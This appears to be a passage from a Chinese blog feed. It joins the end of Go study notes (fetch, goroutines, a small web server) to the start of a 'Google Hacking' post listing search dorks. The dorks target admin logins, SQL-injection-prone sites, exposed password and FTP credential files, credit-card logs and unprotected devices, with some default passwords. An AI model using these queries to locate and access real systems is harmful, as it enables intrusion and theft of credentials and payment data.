class="hljs-literal">true</span>或<span class="hljs-literal">false</span><br>%c 字符（<span class="hljs-type">rune</span>） (Unicode码点)<br>%s 字符串<br>%q 带双引号的字符串<span class="hljs-string">&quot;abc&quot;</span>或带单引号的字符<span class="hljs-string">&#x27;c&#x27;</span><br>%v 变量的自然形式（natural format）<br>%T 变量的类型<br>%% 字面上的百分号标志（无操作数）<br></code></pre></td></tr></table></figure></li><li><p><code>fmt.Printf</code>相当于C的<code>printf</code>函数，可以格式化参数；而<code>fmt.Println</code>函数相当于C++的<code>cout</code>函数，直接输出字符串</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;Alice&quot;</span><br>age := <span class="hljs-number">30</span><br>fmt.Printf(<span class="hljs-string">&quot;Name: %s, Age: %d\n&quot;</span>, name, age)<br>name := <span class="hljs-string">&quot;Bob&quot;</span><br>age := <span class="hljs-number">25</span><br>fmt.Println(<span class="hljs-string">&quot;Name:&quot;</span>, name, <span class="hljs-string">&quot;Age:&quot;</span>, age)<br></code></pre></td></tr></table></figure></li></ul><p>还有另一个方法，一口气把全部输入数据读到内存中，分割为多行，然后处理它们。这个例子引入 了<code>ReadFile</code>函数（来自于<code>io/ioutil</code>包），读取指定文件的全部内容，<code>strings.Split</code>函数把字符串分割成子串的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 循环遍历命令行参数中的每个文件名</span><br><span class="hljs-keyword">for</span> _, filename := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 读取文件的内容</span><br>data, err := ioutil.ReadFile(filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果读取文件发生错误，将错误信息输出到标准错误流并继续处理下一个文件</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;xxx:%v\n&quot;</span>, err)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 将文件内容按行拆分，并统计每行的出现次数</span><br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> strings.Split(<span class="hljs-type">string</span>(data), <span class="hljs-string">&quot;\n&quot;</span>) &#123;<br>counts[line]++<br>&#125;<br>&#125;<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts &#123;<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d\t%s\n&quot;</span>, n, line)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ReadFile</code>函数返回一个字节切片，必须把它转换为<code>string</code>，才能 用<code>strings.Split</code>分割。实现上，<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>和<code>ioutil.WriteFile</code>都使 用<code>*os.File</code>的<code>Read</code>和<code>Write</code>方法，但是，大多数程序员很少需要直接调用那些低级函数。</p><h4 id="获取URL"><a href="#获取URL" class="headerlink" title="获取URL"></a>获取URL</h4><p>Go语言在<code>net</code>这 个强大<code>package</code>的帮助下提供了一系列的<code>package</code>来做这件事情，使用这些包可以更简单地用 网络收发信息，还可以建立更底层的网络连接，编写服务器程序。</p><p>下面是一个使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在文件资源目录下使用终端，命令：<code>go run hello.go http://remixxyh.github.io</code></p><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><h5 id="练习1-7"><a href="#练习1-7" class="headerlink" title="练习1.7"></a>练习1.7</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用<code>io.Copy</code>函数，是题目所给的将内容直接拷贝到标准输出中，将 <code>io.Copy</code> 的返回值存储在一个匿名变量 <code>_</code> 中，因为我们主要关心错误处理，而不是复制的字节数。</p><h5 id="练习1-8"><a href="#练习1-8" class="headerlink" title="练习1.8"></a>练习1.8</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">&quot;http://&quot;</span>) &#123;<br>         url = <span class="hljs-string">&quot;http://&quot;</span> + url<br>      &#125;<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="练习1-9"><a href="#练习1-9" class="headerlink" title="练习1.9"></a>练习1.9</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">&quot;http://&quot;</span>) &#123;<br>         url = <span class="hljs-string">&quot;https://&quot;</span> + url<br>      &#125;<br>      resp, err := http.Get(url)<br>      fmt.Printf(resp.Status)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-18_20-21-57.png"></p><h4 id="并发获取多个URL"><a href="#并发获取多个URL" class="headerlink" title="并发获取多个URL"></a>并发获取多个URL</h4><p>Go语言最有意思并且最新奇的特性就是对并发编程的支持</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>start := time.Now()<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-keyword">go</span> fetch(url, ch)<br>&#125;<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>fmt.Println(&lt;-ch)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%.2fs elapsed\n&quot;</span>, time.Since(start).Seconds())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetch</span><span class="hljs-params">(url <span class="hljs-type">string</span>, ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> &#123;<br>start := time.Now()<br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ch &lt;- fmt.Sprint(err)<br><span class="hljs-keyword">return</span><br>&#125;<br>nbytes, err := io.Copy(ioutil.Discard, resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">&quot;while reading %s: %v&quot;</span>, url, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>secs := time.Since(start).Seconds()<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">&quot;%.2fs %7d %s&quot;</span>, secs, nbytes, url)<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>terminal</code>里执行：<code>go run hello.go https://www.baidu.com http://gopl.io https://remixxyh.github.io</code></p><p>将会得到：</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-31_15-53-48.png"></p><p>我们可以发现整个程序执行的时间由获取请求最长的那个决定</p><p>这是一个并发请求的程序，分析上面的代码：</p><ul><li><code>ch := make(chan string)</code>是一个用于在<code>Goroutine</code>之间传递数据的管道，每当<code>fetch</code>函数执行完毕后，它会将一个带有消息的字符串发送到通道中</li><li><code>Goroutine</code>是一种函数的并发执行方式，<code>main</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的goroutine，并在这个新的goroutine中执行这个函数</li><li>这个程序里会异步执行<code>Get</code>方法，将<code>Body</code>拷贝到<code>ioutil.Discard</code>（可以把这个变量看成一个垃圾桶）输出流中，<code>io.Copy</code>函数会返回两个值(复制的字节数和可能的错误)，从而实现不处理<code>Body</code>，得到响应体的字节数</li><li><strong>在使用通道发送或者接收数据时，如果此时通道已满或者主函数<code>main</code>没有做好接收的准备（注意：<code>main</code>函数也是一个<code>Goroutine</code>），那么会在发送数据的<code>Goroutine</code>那里阻塞，这个例子中就是<code>fetch</code>函数；如果通道为空或者没有数据可以使用，那么会在接收数据的<code>Goroutine</code>那里阻塞。所以这个例子在<code>main</code>使用一个<code>for</code>循环接收数据，是为了防止主函数执行完了但是<code>fetch</code>还没有执行完</strong>。</li></ul><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><p>Go语言的内置库使得写一个类似fetch的web服务器变得异常地简单。在本节中，我们会展示 一个微型服务器，这个服务器的功能是返回当前用户正在访问的URL。比如用户访问的是 <a href="http://localhost:8000/hello">http://localhost:8000/hello</a> ，那么响应是URL.Path &#x3D; “hello”。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handler)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;localhost:8000&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>fmt.Fprintf(w, <span class="hljs-string">&quot;URL.Path = %q\n&quot;</span>, r.URL.Path)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-09-52.png"></p><p>在浏览器里访问：</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-08-41.png"></p><p>多个控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> mu sync.Mutex<br><span class="hljs-keyword">var</span> count <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handler)<br>http.HandleFunc(<span class="hljs-string">&quot;/count&quot;</span>, counter)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;localhost:8000&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-comment">// handler echoes the Path component of the requested URL.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>mu.Lock()<br>count++<br>mu.Unlock()<br>fmt.Fprintf(w, <span class="hljs-string">&quot;URL.Path = %q\n&quot;</span>, r.URL.Path)<br>&#125;<br><br><span class="hljs-comment">// counter echoes the number of calls so far.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">counter</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>mu.Lock()<br>fmt.Fprintf(w, <span class="hljs-string">&quot;Count %d\n&quot;</span>, count)<br>mu.Unlock()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-15-13.png"></p><p>​在这些代码的背后，服务器每一 次接收请求处理时都会另起一个<code>goroutine</code>，这样服务器就可以同一时间处理多个请求。在并发情况下，两个请求同一时刻去更新<code>count</code>，那么这个值可能并不会被正确地 增加；这个程序可能会引发一个严重的<code>bug</code>：竞态条件。</p><p>​<strong>为了避免这个问题，我们必须保证每次修改变量的最多只能有一个<code>goroutine</code>，这也就是代码里的<code>mu.Lock()</code>和 <code>mu.Unlock()</code>调用将修改<code>count</code>的所有行为包在中间的目的。</strong></p><p>第一章的学习就到这里啦，入门了GO👍👍👍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google_Hacking学习</title>
    <link href="/2023/08/14/Google-Hacking%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/14/Google-Hacking%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p> 要学会使用Google-Hacking哦！</p><span id="more"></span><h3 id="Google搜索语法"><a href="#Google搜索语法" class="headerlink" title="Google搜索语法"></a>Google搜索语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">intitle: 搜索网页标题中包含有特定字符的网页。例如输入“intitle: cbi”，这样网页标题中带有cbi的网页都会被搜索出来。<br><br>inurl: 搜索包含有特定字符的URL。例如输入“inurl:cbi”，则可以找到带有cbi字符的URL。<br><br>intext: 搜索网页正文内容中的指定字符，例如输入“intext:cbi”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。Filetype:搜索指定类型的文件。例如输入“filetype:cbi”，将返回所有以cbi结尾的文件URL。<br><br>Site: 找到与指定网站有联系的URL。例如输入“Site:family.chinaok.com”。所有和这个网站有联系的URL都会被显示。这些就是Google的常用语法，也是Google Hack的必用语法。虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。<br></code></pre></td></tr></table></figure><h3 id="GoogleHacking"><a href="#GoogleHacking" class="headerlink" title="GoogleHacking"></a>GoogleHacking</h3><h4 id="寻找登陆页面"><a href="#寻找登陆页面" class="headerlink" title="寻找登陆页面"></a>寻找登陆页面</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>Login <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intitle:</span>后台登录管理员 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intext:</span>后台登录 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/admin/</span>login.php <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/phpmyadmin/</span>index.php 将返回含有phpmyadmin后台的网页<br><br>组合拳：<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php -canvas<br></code></pre></td></tr></table></figure><h4 id="eduSRC"><a href="#eduSRC" class="headerlink" title="eduSRC"></a>eduSRC</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">intext:职业学院 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:职业学院管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:中学 inur<span class="hljs-variable">l:login</span>.php<br>intext:中学 +后台管理 inur<span class="hljs-variable">l:login</span><br></code></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:http://baidu.<span class="hljs-keyword">com</span> <span class="hljs-keyword">filetype</span>:pdf 将只返回http://baidu.<span class="hljs-keyword">com</span>站点上文件类型为pdf的网页<br></code></pre></td></tr></table></figure><p>link:<a href="https://link.zhihu.com/?target=http://www.baidu.com">http://www.baidu.com</a> 将返回所有包含指向<a href="https://link.zhihu.com/?target=http://www.baidu.com">http://www.baidu.com</a>的网页</p><p>related:<a href="https://link.zhihu.com/?target=http://www.llhc.edu.cn">http://www.llhc.edu.cn</a> 将返回与<a href="https://link.zhihu.com/?target=http://www.llhc.edu.cn">http://www.llhc.edu.cn</a>相似的页面，相似指的是网页的布局相似</p><p>index of &#x2F;admin 发现允许目录浏览的web网站</p><p>inurl:share.cgi?ssid&#x3D; 云服务器文件和文件夹共享</p><p>intitle:”Welcome to QNAP Turbo NAS” QNAP登录页面</p><p>inurl:”img&#x2F;main.cgi?next_file” 在线摄像头</p><p>ext:log inurl:”&#x2F;pgadmin” 包含多媒体信息的文件,pgAdmin客户端日志文件</p><p>“<a href="https://link.zhihu.com/?target=http://m.zippyshare.com/">http://m.zippyshare.com/</a>“ 敏感目录</p><p>“– Account dump” ext:sql-git 使用标签查找关于MySQL转储的信息</p><p>inurl:_vti_pvt&#x2F;administrators.pwd 用于检索MS FrontPage共享点的敏感信息登录&#x2F;密码</p><p>inurl:front&#x2F;central.php 包含登录门户的页面</p><p>inurl:zabbix.php AND intext:”Zabbix SIA” zxbbix网络监控系统</p><p>inurl:”&#x2F;wp-admin&#x2F;setup-config.php” intitle:”Setup Configuration File” 找未完成的安装Wordpress</p><p>inurl:scgi-bin intitle:”NETGEAR ProSafe” 千兆防火墙。默认用户名：admin。默认密码：密码inurl：scgi-bin</p><p>inurl:index of&#x3D; %2F &#x2F;admin login %2F intitle:”Administration Login - 网络托管公司的管理员登录</p><p>intitle:”twonky server” inurl:”9000” -intext:”9000” 查找Twonky媒体共享服务器</p><p>inurl:”sitemanager.xml” ext:xml -git 查找FileZilla站点管理器文件，其中包含FTP用户名和密码Dxtroyer</p><p>intitle:”Sign in · GitLab” 查找GitLab登录页面</p><p>inurl:”&#x2F;api&#x2F;index.php” intitle:UniFi 查找具有多信息的UniFi API浏览器，如WiFi密码redstoner2014</p><p>inurl:”wp-content&#x2F;uploads&#x2F;file-manager&#x2F;log.txt” WordPress插件文件管理器日志文件有趣的信息</p><p>“TX_start” “card_name” ext:log 从商店查找交易记录，其中包含多汁的信用卡&#x2F;借记卡信息</p><p>intitle:”Namenode information” AND inurl:”:50070&#x2F;dfshealth.html” 用于基础设施Hadoop的NameNode存储信息</p><p>inurl:&#x2F;_layouts&#x2F;mobile&#x2F;view.aspx?List&#x3D; 包含用户名的文件</p><p>inurl:”.php?id&#x3D;” “You have an error in your SQL syntax” 找到sql注入的网站</p><p>inurl:&#x2F;proc&#x2F;self&#x2F;cwd 遭到入侵的易受攻击的Web服务器</p><p>inurl:&#x2F;remote&#x2F;login?lang&#x3D;en 查找FortiGate防火墙的SSL-VPN登录门户</p><p>intitle:”Plesk Onyx” intext:”Interface language” 查找Plesk Onyx登录页面</p><p>intitle:”GitBucket” intext:”Recent updated repositories” intext:”Sign In” 查找GitBucket服务器</p><p>intitle:”cuckoo sandbox” “failed_reporting” cuckoo 失败报考</p><p>“You‘re successfully running JSON Server” 成功运行JSON服务器</p><p>index of &#x2F;htdocs 用于查找未经授权的Web服务器，并通过‘htdocs‘文件夹查找所有敏感信息</p><p>inurl:login.cgi intitle:NETGEAR NETGEAR 在线查找GSS108E ProSAFE PoE +点击开关,默认密码password</p><p>inurl:”&#x2F;ap&#x2F;recuperadocumentossql.aspx” AuraPortal：内部文件</p><p>intitle:”Namenode information” 查找无密封的文件系统，等待被利用</p><p>inurl:”&#x2F;ADVANCED&#x2F;COMMON&#x2F;TOP” 查找无密码的爱普生打印机</p><p>filetype:ini “wordfence”. 找到运行Wordfence WAF的WordPress网站</p><p>intitle:”Index of” “Apache&#x2F;2.4.7 (Ubuntu) Server” 用于查找Ubuntu服务器和某个版本的Apache</p><p>“Sorting Logs:” “Please enter your password” “Powered By” -urlscan -alamy 找到stealer僵尸网络控制面板</p><p>intitle:”Index of &#x2F;“ “mod_ssl 2.2.22 OpenSSL&#x2F;1.0.1” 找到易受攻击的Bug Dxtroyer的OpenSSL服务器</p><p>intitle:”Index of &#x2F;“ “Proudly Served by Surftown at” 查找Surftown HTTP服务器Dxtroyer</p><p>“Blocking Reason:” ext:log -git 找到安全漏洞日志Dxtroyer</p><p>inurl:”&#x2F;logs&#x2F;www” ext:log 查找连接日志，用户代理，错误等</p><p>intitle:”Index of &#x2F;“ “joomla_update.php” 找到具有Joomla日志的目录，通常包含多汁的信息</p><p>intext:uploadOverwrite || intext:OPEN || intext:cwd cwd作者</p><p>intext:DB_PASSWORD || intext:”MySQL hostname” ext:txt 允许你搜索WordPress配置</p><p>site:<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a> intext:”<em>@</em>.com:*” 查找<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a>转储的邮件列表，密码TPNight</p><p>inurl:”g2_view&#x3D;webdav.WebDavMount” 查找启用WebDAV的网站TPNight</p><p>-inurl:htm -inurl:html intitle:”index of” NIKON 浏览尼康数码单反相机和相机目录中上传和保存的图像和照片</p><p>-inurl:htm -inurl:html intitle:”index of” 100CANON 